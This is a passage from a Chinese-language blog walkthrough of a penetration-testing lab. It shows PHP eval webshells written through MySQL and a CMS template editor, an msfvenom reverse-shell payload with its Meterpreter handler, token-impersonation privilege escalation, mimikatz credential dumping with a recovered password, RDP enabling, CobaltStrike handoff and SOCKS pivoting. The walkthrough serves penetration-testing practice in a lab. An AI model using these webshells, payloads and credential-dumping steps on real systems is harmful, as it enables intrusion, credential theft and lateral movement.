src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605005633874.png" alt="弱口令爆破处"></p><p>登录之后是英文的，把语言换成中文(Simplified)</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605084538186.png" alt="/其他信息"></p><p>本来是想直接利用mysql写入shell的，但是好像是模式不对，不能写入文件。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">创建数据表导出shell，写shell到目标主机CREATE TABLE &#96;mysql&#96;.&#96;user1&#96; (&#96;content&#96; TEXT NOT NULL );INSERT INTO &#96;mysql&#96;.&#96;user1&#96; (&#96;content&#96; ) VALUES (&#39;&lt;?php @eval($_POST[x123]);?&gt;&#39;);SELECT &#96;content&#96; FROM &#96;user1&#96; INTO OUTFILE &#39;C:\\phpStudy\\WWW\\xxx.php&#39;;DROP TABLE IF EXISTS &#96;user1&#96;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605113426399.png" alt="禁止写文件"></p><p><strong>注意到还有个网站的数据库</strong></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605113549994.png" alt="image-20210605113549994"></p><h4 id="4-后台Getshell上传技巧"><a href="#4-后台Getshell上传技巧" class="headerlink" title="4.后台Getshell上传技巧"></a>4.后台Getshell上传技巧</h4><p>经典，太经典了啊</p><p><a href="https://blog.csdn.net/LK20191121/article/details/103181514">YXcms getshell</a></p><p>这里采用的是文件上传</p><p><strong>先通过刚才的数据库信息获得该站的管理员账号密码</strong></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605114122717.png" alt="看一下管理员的账号密码"></p><pre class="line-numbers language-none"><code class="language-none">admin&#x2F;168a73655bfecefdb15b14984dd2ad60admin&#x2F;949ba59abbe56e05<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605114222423.png" alt="将管理员的密码解一下md5"></p><p>登录网站管理员</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605114419482.png" alt></p><p>登不上，我人傻了，我这里有两处错误，</p><ol><li>首先是密码不是刚才解得的，还有一层hash应该是，但是我不知道怎么解，这里可以直接使用YXcms的弱口令来登入管理员，</li><li>其次就是我这个路径不对，这是一般账号登入的地方，管理员应该把member换为admin来登入即可。</li></ol><p>前台模板处可以getshell</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605115353980.png" alt></p><p>这里直接新建一个<code>eval.php</code>文件，内容写为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"m4xlmum"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605120306642.png" alt></p><p>这里我没有找到前台文件的路径，但是考虑到可以使用<code>../</code>来进行目录穿越直接将文件写入站点的根目录，进根目录发现确实已经写入了。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605120551436.png" alt="没有出现404 not found就是已经把shell写入了"></p><p>使用蚁剑连接shell</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605122429678.png" alt></p><h4 id="5-系统信息收集"><a href="#5-系统信息收集" class="headerlink" title="5.系统信息收集"></a>5.系统信息收集</h4><pre class="line-numbers language-none"><code class="language-none">(*) 基础信息当前路径: C:&#x2F;phpStudy&#x2F;WWW磁盘列表: C:D:系统信息: Windows NT STU1 6.1 build 7601 (Windows 7 Business Edition Service Pack 1) i586当前用户: Administrator(*) 输入 ashelp 查看本地命令C:\phpStudy\WWW&gt; cd C:&#x2F;phpStudy&#x2F;WWW&#x2F;C:\phpStudy\WWW&gt; whoamigod\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>连接远程桌面(rdesktop)</strong></p><p>蚁剑开一下终端，发现是域用户administrator账号的权限。这时这台主机的权限几乎就全拿到了，然后就是开一下端口方便我们进行远程连接</p><pre class="line-numbers language-none"><code class="language-none"># 开windows 3389端口的命令REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f# 关windows 3389端口的命令REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 11111111 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>下面就是<strong>连接windows远程桌面的命令</strong></p><pre class="line-numbers language-none"><code class="language-none">kali连接rdp远程桌面**命令**rdesktop -g 1440x900 -r disk:LinuxDisk&#x3D;&#x2F;root&#x2F;Downloads -u administrator -p &quot;password&quot; 192.168.72.128:3389# 如果无rdesktop工具，可用 sudo apt install rdesktop 命令安装**参数**-g    # 窗口分辨率-r    # 本地目录共享-u    # 用户名-p    # 密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="6-主机密码收集"><a href="#6-主机密码收集" class="headerlink" title="6.主机密码收集"></a>6.主机密码收集</h4><p>上面的这个系统信息没什么好收集的感觉，直接尝试能不能dump出windows主机的用户名/密码。使用msf + mimikatz</p><p>先使用msf制作一个适用于win7的后门程序，这里我直接就使用的是msf自带的payload了，没用CS的payload，一是CS和msf的联动现在还不太会，二是这个系统版本不新，也没有什么好的防御措施(例如360、卡巴斯基等等)，所以不做免杀也该也是能过的。</p><pre class="line-numbers language-none"><code class="language-none"># msf生成适用于win7的后门程序msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.72.130 LPORT&#x3D;4444 -f exe -o ~&#x2F;桌面&#x2F;shell┌──(m4xlmum㉿kali)-[~]└─$ msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.72.130 LPORT&#x3D;4444 -f exe -o ~&#x2F;桌面&#x2F;shell  [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 354 bytesFinal size of exe file: 73802 bytesSaved as: &#x2F;home&#x2F;m4xlmum&#x2F;桌面&#x2F;shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>后缀名加个<code>.exe</code>就行了，生成的时候忘记加了。然后把shell上传到win7里面(使用蚁剑的上传功能)</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605134737305.png" alt></p><p>在蚁剑中打开一个终端，切换到这个存在shell的目录下面，使用如下命令执行shell(为保证万无一失，这里先不执行，等kali监听做好了再执行)。</p><pre class="line-numbers language-none"><code class="language-none">start shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>配置攻击机的监听选项</strong></p><pre class="line-numbers language-none"><code class="language-none">msf6 &gt; use exploit&#x2F;multi&#x2F;handler [*] Using configured payload generic&#x2F;shell_reverse_tcpmsf6 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcppayload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcpmsf6 exploit(multi&#x2F;handler) &gt; show optionsModule options (exploit&#x2F;multi&#x2F;handler):   Name  Current Setting  Required  Description   ----  ---------------  --------  -----------Payload options (windows&#x2F;meterpreter&#x2F;reverse_tcp):   Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)   LHOST                      yes       The listen address (an interface may be specified)   LPORT     4444             yes       The listen portExploit target:   Id  Name   --  ----   0   Wildcard Targetmsf6 exploit(multi&#x2F;handler) &gt; set lhost 192.168.72.130lhost &#x3D;&gt; 192.168.72.130msf6 exploit(multi&#x2F;handler) &gt; run[*] Started reverse TCP handler on 192.168.72.130:4444 [*] Sending stage (175174 bytes) to 192.168.72.128[*] Meterpreter session 1 opened (192.168.72.130:4444 -&gt; 192.168.72.128:21682) at 2021-06-05 13:55:48 +0800<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我是在run之后再去蚁剑的终端里面start那个后门程序的，这时已经获得了shell的连接了，输入shell获得powershell，然后查看自己的权限。</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; shellProcess 2264 created.Channel 1 created.Microsoft Windows [�汾 6.1.7601]��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����C:\Program Files&gt;whoamiwhoamigod\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然这里是administrator，但是却并不是SYSTEM权限，这里就需要我们再提一下权限了</p><p><strong>Windows 7 权限提升</strong></p><p>提权参考<a href="https://blog.csdn.net/nzjdsds/article/details/82262830">Windows提权辅助工具使用参考文章</a></p><p>先在蚁剑的shell下生成一个Systeminfo命令的文本文档，命名为<code>win7.txt</code>。</p><pre class="line-numbers language-none"><code class="language-none">Systeminfo &gt; win7.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把这个文件拉到kali里面，然后下载<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a></p><pre class="line-numbers language-none"><code class="language-none"># 先更新一下数据库┌──(m4xlmum㉿kali)-[~&#x2F;桌面&#x2F;web&#x2F;windows权限提升]└─$ python windows-exploit-suggester.py --update                            1 ⨯[*] initiating winsploit version 3.3...[+] writing to file 2021-06-05-mssb.xls[*] done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后查看可以使用的有针对性的漏洞，但是需要注意的是，使用这个工具需要下载<code>xlrd</code>python库并且版本不能太高，我用的时候报错了，重新安装了<code>pip install xlrd==1.2.0</code>才解决了，并且要使用python2。</p><pre class="line-numbers language-none"><code class="language-none">python windows-exploit-suggester.py --database 2021-06-05-mssb.xls --systeminfo win7.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里我截取了一部分存在远程代码执行的漏洞，看看msfdb里面有没有对应的POC，从上向下找。</p><pre class="line-numbers language-none"><code class="language-none">[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;40039&#x2F;, PoC[*] [E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;39232&#x2F; -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;39233&#x2F; -- Microsoft Office &#x2F; COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC[*] [E] MS15-134: Security Update for Windows Media Center to Address Remote Code Execution (3108669) - Important[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;38911&#x2F; -- Microsoft Windows Media Center Library Parsing RCE Vulnerability aka self-executing&#39; MCL File, PoC[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;38912&#x2F; -- Microsoft Windows Media Center Link File Incorrectly Resolved Reference, PoC[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;38918&#x2F; -- Microsoft Office &#x2F; COM Object - &#39;els.dll&#39; DLL Planting (MS15-134)[*]   https:&#x2F;&#x2F;code.google.com&#x2F;p&#x2F;google-security-research&#x2F;issues&#x2F;detail?id&#x3D;514 -- Microsoft Office &#x2F; COM Object DLL Planting with els.dll[*] [E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;38968&#x2F; -- Microsoft Office &#x2F; COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;38918&#x2F; -- Microsoft Office &#x2F; COM Object els.dll DLL Planting (MS15-134), PoC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是这次不想用上面的这些漏洞，想试试msfconsole自带的一些漏洞利用工具，这里选择使用<code>post/multi/recon/local_exploit_suggester</code>，使用方法与命令如下:</p><p>漏洞利用 &amp; 权限提升</p><pre class="line-numbers language-none"><code class="language-none">msf6 exploit(multi&#x2F;handler) &gt; run[*] Started reverse TCP handler on 192.168.72.130:4444 [*] Sending stage (175174 bytes) to 192.168.72.128[*] Meterpreter session 2 opened (192.168.72.130:4444 -&gt; 192.168.72.128:22785) at 2021-06-05 15:44:09 +0800meterpreter &gt; background[*] Backgrounding session 2...msf6 exploit(multi&#x2F;handler) &gt; sessionsActive sessions&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  Id  Name  Type                  Information            Connection  --  ----  ----                  -----------            ----------  2         meterpreter x86&#x2F;wind  GOD\Administrator @ S  192.168.72.130:4444 -            ows                   TU1                    &gt; 192.168.72.128:2278                                                         5 (192.168.72.128)msf6 exploit(multi&#x2F;handler) &gt; use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggestermsf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; set session 2session &#x3D;&gt; 2msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; exploit[*] 192.168.72.128 - Collecting local exploits for x86&#x2F;windows...[*] 192.168.72.128 - 38 exploit checks are being tried...[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ms10_092_schelevator: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ms13_053_schlamperei: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ms13_081_track_popup_menu: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ms14_058_track_popup_menu: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ms15_051_client_copy_image: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection_juicy: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ntusermndragover: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ppr_flatten_rec: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;tokenmagic: The target appears to be vulnerable.[*] Post module execution completedmsf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的所有exploit只试了一个，试了试漏洞<code>ms16_075</code>，但是直接使用msf的poc似乎会出错，参考<a href="https://blog.csdn.net/cj_Allen/article/details/105489922">Metasploit下利用ms16-075提权</a>，在下面这个地方<a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">下载该exploit</a></p><p><strong>ms16_075权限提升</strong></p><p>下载好上面的那个potato.exe文件之后，将这个exe文件上传至<code>c:/</code>目录下，然后执行以下命令来提权</p><pre class="line-numbers language-none"><code class="language-none">use incognito                     ：加载incoginto功能（用来盗窃目标主机的令牌或是假冒用户)list_tokens -u    ：列出目标主机用户的可用令牌execute -cH -f c:&#x2F;potato.exe       :创建新的进程list_tokens -u :列出目标主机用户的可用令牌impersonate_token &quot;NT AUTHORITY\SYSTEM&quot; :假冒目标主机上的可用令牌# 实际上执行下面这三条命令应该就足够了use incognitoexecute -cH -f c:&#x2F;potato.exeimpersonate_token &quot;NT AUTHORITY\SYSTEM&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605163004946.png" alt="中间错误较多，不复制粘贴了"></p><p><strong>kiwi明文密码抓取</strong></p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; load kiwi[!] The &quot;kiwi&quot; extension has already been loaded.meterpreter &gt; help kiwiKiwi Commands&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;    Command                Description    -------                -----------    creds_all              Retrieve all credentials (parsed)    creds_kerberos         Retrieve Kerberos creds (parsed)    creds_livessp          Retrieve Live SSP creds    creds_msv              Retrieve LM&#x2F;NTLM creds (parsed)    creds_ssp              Retrieve SSP creds    creds_tspkg            Retrieve TsPkg creds (parsed)    creds_wdigest          Retrieve WDigest creds (parsed)    dcsync                 Retrieve user account information via DCSync (unparsed)    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync    golden_ticket_create   Create a golden kerberos ticket    kerberos_ticket_list   List all kerberos tickets (unparsed)    kerberos_ticket_purge  Purge any in-use kerberos tickets    kerberos_ticket_use    Use a kerberos ticket    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)    lsa_dump_sam           Dump LSA SAM (unparsed)    lsa_dump_secrets       Dump LSA secrets (unparsed)    password_change        Change the password&#x2F;hash of a user    wifi_list              List wifi profiles&#x2F;creds for the current user    wifi_list_shared       List shared wifi profiles&#x2F;creds (requires SYSTEM)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里应该是我环境配置的原因，直接就上管理员权限了，先加载msf的模块<code>kiwi</code>，这个模块代替了<code>mimikatz</code>模块，上面的命令为查询kiwi模块的使用方式的命令。</p><p><strong>kiwi_cmd模块，可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令即可</strong></p><p>kiwi专用的命令</p><pre class="line-numbers language-none"><code class="language-none">load kiwicreds_all<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>没dump出来，但是直接用mimikatz的话会报错，必须把当前进程迁移到64位进程中去，进程迁移使用以下命令，ps回显太多不复制了。</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; psProcess List&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; PID   PPID  Name               Arch  Session  User                          Path ---   ----  ----               ----  -------  ----                          ---- 0     0     [System Process] 4     0     System             x64   0 252   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe 308   612   slui.exe           x64   1        GOD\Administrator             C:\Windows\System32\slui.exe 332   324   csrss.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe 340   492   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe 384   324   wininit.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe 396   376   csrss.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe 432   376   winlogon.exe       x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe 492   384   services.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe 500   384   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exemeterpreter &gt; migrate 332[*] Migrating from 1196 to 2044...[*] Migration completed successfully.meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605165646907.png" alt="image-20210605165646907"></p><p>账户密码获得为</p><pre class="line-numbers language-none"><code class="language-none">administrator&#x2F;@dmin123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>开3389端口</strong></p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp[*] Enabling Remote Desktop[*] RDP is already enabled[*] Setting Terminal Services service startup mode[*] Terminal Services service is already set to auto[*] Opening port in local firewall if necessary[*] For cleanup execute Meterpreter resource file: &#x2F;home&#x2F;m4xlmum&#x2F;.msf4&#x2F;loot&#x2F;20210605172936_default_192.168.72.128_host.windows.cle_771977.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605173036618.png" alt></p><p><strong>开远程桌面</strong></p><pre class="line-numbers language-none"><code class="language-none">rdesktop -g 1440x900  192.168.72.128:3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">用户名: GOD\administrator   # 域用户登录，用户民格式为：域名\用户名密  码: @dmin123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605173536027.png" alt></p><p>这个最好是再开一个用户，而且再开一个用户也应该用不到抓administrator的用户密码了，所做的工作就会少很多（主要是学习嘛，也走了许多弯路）。</p><h3 id="三、内网搜集"><a href="#三、内网搜集" class="headerlink" title="三、内网搜集"></a>三、内网搜集</h3><h4 id="7-内网—继续信息收集"><a href="#7-内网—继续信息收集" class="headerlink" title="7.内网—继续信息收集"></a>7.内网—继续信息收集</h4><p>接下来看看其他主机了，这个已经算是拿下了吧，虽然不太完美，下一个争取完美一点。</p><p><strong>配置静态路由</strong></p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; run autoroute -s 192.168.52.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>内网存活主机扫描</strong></p><p>使用msf自带netbios扫描内网存活机器，发现存活机器还有其他两台，地址分别为<code>192.168.52.138</code>和<code>192.168.52.141</code>，本机为<code>192.168.52.143</code></p><pre class="line-numbers language-none"><code class="language-none">msf6 exploit(multi&#x2F;handler) &gt; use auxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbnamemsf6 auxiliary(scanner&#x2F;netbios&#x2F;nbname) &gt; set session 1session &#x3D;&gt; 1msf6 auxiliary(scanner&#x2F;netbios&#x2F;nbname) &gt; set rhosts 192.168.52.0&#x2F;24rhosts &#x3D;&gt; 192.168.52.0&#x2F;24msf6 auxiliary(scanner&#x2F;netbios&#x2F;nbname) &gt; exploit[*] Sending NetBIOS requests to 192.168.52.0-&gt;192.168.52.255 (256 hosts)[+] 192.168.52.138 [OWA] OS:Windows Names:(OWA, GOD) Addresses:(192.168.52.138) Mac:00:0c:29:3f:5d:a9 Virtual Machine:VMWare[+] 192.168.52.141 [ROOT-TVI862UBEH] OS:Windows Names:(ROOT-TVI862UBEH, GOD, __MSBROWSE__) Addresses:(192.168.52.141) Mac:00:0c:29:6d:39:34 Virtual Machine:VMWare[+] 192.168.52.143 [STU1] OS:Windows Names:(STU1, GOD)  Mac:00:0c:29:a7:c1:a8 Virtual Machine:VMWare[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>域内信息收集命令(抄徐神的，爽)</strong></p><pre class="line-numbers language-none"><code class="language-none">net time &#x2F;domain        #查看时间服务器net user &#x2F;domain        #查看域用户net view &#x2F;domain        #查看有几个域net group &quot;domain computers&quot; &#x2F;domain         #查看域内所有的主机名net group &quot;domain admins&quot;   &#x2F;domain          #查看域管理员net group &quot;domain controllers&quot; &#x2F;domain       #查看域控<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="四、横向移动"><a href="#四、横向移动" class="headerlink" title="四、横向移动"></a>四、横向移动</h3><h4 id="8-CobaltStrike联动msf"><a href="#8-CobaltStrike联动msf" class="headerlink" title="8.CobaltStrike联动msf"></a>8.CobaltStrike联动msf</h4><p>msf获取到shell后，可以派发给cobaltstrike，首先cobaltstrike创建监听器：</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605193822354.png" alt></p><p>msf执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;payload_injectset payload windows&#x2F;meterpreter&#x2F;reverse_httpset DisablePayloadHandler true   #payload_inject执行之后会在本地产生一个新的handler，设置为true表示不重复生成set lhost 192.168.72.130                 #公网vps ipset lport 8888                  #监听端口 set session 1                   #派发session idexploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行完所有命令之后将会看到CobaltStrike中有一台主机上线</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605194323631.png" alt></p><p>这里的原理就是，受害者网络反弹了一个shell到msf，msf又给自己生成了一个shell，再将网络送到CS(大概猜测)。</p><h4 id="9-搭建跳板主机"><a href="#9-搭建跳板主机" class="headerlink" title="9.搭建跳板主机"></a>9.搭建跳板主机</h4><p>其实就是将拿到权限的受害者主机(win7 web服务器)作为跳板(代理服务器)来连通内网。</p><p><strong>搭建Socket4a隧道 + proxychains</strong></p><pre class="line-numbers language-none"><code class="language-none">backgrounduse auxiliary&#x2F;server&#x2F;socks_proxyset version 4arunjobs  # 查看任务是否正常执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">vi &#x2F;etc&#x2F;proxychains.conf  #配置proxychainssocks4 127.0.0.1 1080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这是就算是成功搭建跳板主机了，测试一下</p><pre class="line-numbers language-none"><code class="language-none">proxychains curl http:&#x2F;&#x2F;192.168.72.128<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回的是php study探针的内容的话应该就是搭建成功了的。</p><h4 id="10-内网端口扫描"><a href="#10-内网端口扫描" class="headerlink" 